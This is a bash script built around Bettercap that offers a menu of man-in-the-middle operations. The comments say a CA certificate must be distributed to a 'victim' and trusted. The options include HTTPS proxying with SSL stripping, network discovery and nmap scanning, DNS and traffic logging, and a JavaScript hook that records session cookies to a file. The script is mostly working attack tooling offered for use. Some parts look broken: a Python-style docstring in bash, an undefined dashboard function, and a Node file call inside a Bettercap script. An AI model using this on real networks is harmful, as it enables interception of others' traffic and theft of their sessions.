#!/bin/bash

"""
    To decrypt HTTPS traffic, install Bettercap's CA certificate on target devices: 
    --> This must be served on the victim before the attack starts.
    --> The victim must trust the CA certificate. 
    ##### The certificate will be saved to ~/.bettercap-ca.cert.pem. Distribute this to victim

    This script also provides network reconnaissance capabilities:
    --> Device discovery (type, vendor, hostname)
    --> IP address mapping
    --> Traffic destination monitoring
"""

# Check if Bettercap is installed
check_bettercap() {
    if ! command -v bettercap &> /dev/null; then
        echo "[!] Bettercap not found. Installing..."
        echo "[+] On Debian/Ubuntu: sudo apt install bettercap"
        echo "[+] On Arch: sudo pacman -S bettercap"
        echo "[+] From source: https://github.com/bettercap/bettercap"
        exit 1
    fi
    echo "[+] Bettercap is installed."
}

# Generate a CA certificate
bettercap_ca() {
    echo "[+] Generating Bettercap CA certificate..."
    bettercap -eval "http.proxy on; https.proxy on; http.proxy.sslstrip true;"
}

# Verify certificate creation
verify_cert() {
    if [ -f ~/.bettercap-ca.cert.pem ]; then
        echo "[+] Certificate successfully created at: ~/.bettercap-ca.cert.pem"
        echo "[+] Certificate details:"
        openssl x509 -in ~/.bettercap-ca.cert.pem -text -noout | grep -E "Subject:|Issuer:|Not Before:|Not After"
    else
        echo "[!] Certificate creation failed. Please try running bettercap manually."
        exit 1
    fi
}

# Copy certificate to the current directory (optional)
copy_cert() {
    cp ~/.bettercap-ca.cert.pem ./bettercap-ca.cert.pem
    echo "[+] Certificate copied to current directory: ./bettercap-ca.cert.pem"
}

# Network reconnaissance function
network_recon() {
    echo "[+] Starting network reconnaissance..."
    
    # Create a caplet file for network discovery
    cat > network_recon.cap << EOF
# Enable network discovery
net.probe on

# Set probe interval
set net.probe.throttle 10

# Wait for discovery
sleep 20

# Show discovered hosts
net.show

# Start sniffing to capture traffic
set net.sniff.verbose true
set net.sniff.local true
net.sniff on

# Display discovered hosts and traffic
events.stream off
events.show

# Wait for user to view data
sleep 5
EOF

    # Run bettercap with the caplet
    echo "[+] Running network discovery (will take about 30 seconds)..."
    sudo bettercap -caplet network_recon.cap -eval "ticker on"
    
    # Clean up
    rm network_recon.cap
}

# Advanced network scanning with detailed device information
detailed_scan() {
    echo "[+] Starting detailed network scan (requires nmap)..."
    
    if ! command -v nmap &> /dev/null; then
        echo "[!] Nmap not found. Install with: sudo apt install nmap"
        return
    fi
    
    # Get local subnet
    local_ip=$(ip route get 1 | awk '{print $7;exit}')
    subnet=$(ip -o -f inet addr show | awk '/scope global/ {print $4}' | head -n 1)
    
    echo "[+] Scanning subnet: $subnet"
    sudo nmap -sS -O -F --osscan-guess $subnet -oG nmap_scan.txt
    
    echo "[+] Scan complete. Results saved to nmap_scan.txt"
    echo "[+] Summary of discovered devices:"
    cat nmap_scan.txt | grep "Status: Up" -A 2 | grep -v "Status: Up" | grep -v "\-\-"
}

# Network traffic logging function (DNS, MAC, IP)
log_network_traffic() {
    echo "[+] Starting network traffic logging..."
    local log_file="network_traffic_$(date +%Y%m%d_%H%M%S).log"
    
    # Create a caplet file for traffic logging
    cat > traffic_logger.cap << EOF
# Start network sniffer with specific options for DNS, MAC, IP
set net.sniff.verbose true
set net.sniff.local true
# Focus on DNS traffic and general IP traffic
set net.sniff.filter udp port 53 or tcp
net.sniff on

# Custom logging function using events
set events.stream.output $log_file
events.stream on

# Initialize custom logging format
set events.ignore.empty false

# Print to console as well
events.show

# Helper message
echo "Logging network traffic to $log_file. Press Ctrl+C to stop."
EOF

    echo "[+] Logging network traffic to $log_file..."
    echo "[+] Press Ctrl+C to stop logging"
    
    # Run bettercap with the caplet
    sudo bettercap -caplet traffic_logger.cap
    
    # Clean up
    rm traffic_logger.cap
    echo "[+] Logging stopped. Results saved to $log_file"
    echo "[+] Quick traffic summary:"
    
    # Provide a quick summary of the logs
    echo "Top DNS requests:"
    grep -i "dns.response" $log_file | awk '{print $NF}' | sort | uniq -c | sort -nr | head -10
    
    echo "Top source IPs:"
    grep -E "IP [0-9]+" $log_file | awk '{print $4}' | cut -d'.' -f1-4 | sort | uniq -c | sort -nr | head -10
    
    echo "Top destination IPs:"
    grep -E "IP [0-9]+" $log_file | awk '{print $6}' | cut -d'.' -f1-4 | sort | uniq -c | sort -nr | head -10
}

# Cookie capture function
capture_cookies() {
    echo "[+] Starting cookie capture..."
    local cookie_file="cookies_$(date +%Y%m%d_%H%M%S).txt"
    
    # Create a caplet file for cookie capture
    cat > cookie_capture.cap << EOF
# Start HTTP proxy with cookie capturing
http.proxy on
https.proxy on
http.proxy.sslstrip true

# JS hook to capture cookies
set http.proxy.script.response /usr/share/bettercap/caplets/http-response.js

# Custom script to extract and log cookies
set scriptsPath .
set script.file cookie_logger.js

# Start the script engine
script on

# Start sniffing to capture all HTTP/HTTPS traffic
set net.sniff.verbose false
set net.sniff.local true
set net.sniff.filter tcp port 80 or tcp port 443
net.sniff on

# Display real-time events
events.stream on
EOF

    # Create cookie extraction JS script
    cat > cookie_logger.js << EOF
function onResponse(req, res) {
    if (res.Headers.hasOwnProperty('Set-Cookie')) {
        var cookies = res.Headers['Set-Cookie']
        var host = "";
        
        if (req.Headers.hasOwnProperty('Host')) {
            host = req.Headers['Host'];
        }
        
        console.log("\\n[COOKIE] Host: " + host);
        console.log("[COOKIE] Path: " + req.Path);
        console.log("[COOKIE] Cookies: " + cookies);
        
        // Log to file
        var fs = require('fs');
        fs.appendFileSync("$cookie_file", "Host: " + host + "\\nPath: " + req.Path + "\\nCookies: " + cookies + "\\n\\n");
    }
    
    return res;
}
EOF

    echo "[+] Cookie capture setup complete. Saving to $cookie_file"
    echo "[+] Press Ctrl+C to stop capturing"
    
    # Run bettercap with the caplet
    sudo bettercap -caplet cookie_capture.cap
    
    # Clean up
    rm cookie_capture.cap cookie_logger.js
    
    echo "[+] Cookie capture stopped. Results saved to $cookie_file"
    if [ -f "$cookie_file" ]; then
        echo "[+] Cookie sample (first 10 entries):"
        head -20 "$cookie_file"
    else
        echo "[!] No cookies captured during the session."
    fi
}

# Traffic monitoring function
monitor_traffic() {
    echo "[+] Setting up traffic monitoring..."
    
    # Create a caplet file for traffic monitoring
    cat > traffic_monitor.cap << EOF
# Start network sniffer with specific options
set net.sniff.verbose true
set net.sniff.local true
set net.sniff.filter tcp port 80 or tcp port 443 or udp port 53
net.sniff on

# Enable HTTP proxy and HTTPS proxy
http.proxy on
https.proxy on

# Enable SSL stripping
http.proxy.sslstrip true

# Show real-time events
events.stream on

# Track HTTP requests and responses
set http.proxy.script.request /usr/share/bettercap/caplets/http-req-dump.js
set http.proxy.script.response /usr/share/bettercap/caplets/http-resp-dump.js

# Display help message
help ticker
EOF

    echo "[+] Starting traffic monitoring... Press Ctrl+C to stop"
    sudo bettercap -caplet traffic_monitor.cap
    
    # Clean up
    rm traffic_monitor.cap
}

main() {
    echo "=== Bettercap HTTPS Decryption & Network Monitoring Setup ==="
    check_bettercap
    
    # Display menu
    echo ""
    echo "Select an option:"
    echo "1) Generate CA certificate for HTTPS decryption"
    echo "2) Network reconnaissance (device discovery)"
    echo "3) Detailed device scan (type, OS, open ports)"
    echo "4) Monitor network traffic (destinations, protocols)"
    echo "5) Log network traffic (DNS, MAC, IP)"
    echo "6) Capture cookies from web traffic"
    echo "7) Launch web dashboard"
    echo "8) Exit"
    echo ""
    read -p "Enter your choice [1-8]: " choice
    
    case $choice in
        1)
            bettercap_ca
            verify_cert
            copy_cert
            
            echo ""
            echo "=== Next Steps ==="
            echo "[!] Distribute this certificate to the target device"
            echo "[!] The target must install and trust this certificate"
            echo "[!] For Android: Import in Settings > Security > Encryption & Credentials"
            echo "[!] For iOS: Simply open the certificate file on the device"
            echo "[!] For Windows: Double-click and install to Trusted Root Certificate Authorities"
            echo "[!] For macOS: Double-click and add to System keychain"
            ;;
        2)
            network_recon
            ;;
        3)
            detailed_scan
            ;;
        4)
            monitor_traffic
            ;;
        5)
            log_network_traffic
            ;;
        6)
            capture_cookies
            ;;
        7)
            live_dashboard
            ;;
        8)
            echo "Exiting..."
            exit 0
            ;;
        *)
            echo "Invalid option. Please try again."
            ;;
    esac
    
    echo ""
    echo "[+] For manual control, run Bettercap with:"
    echo "    sudo bettercap -eval \"http.proxy on; https.proxy on; http.proxy.sslstrip true;\""
}

main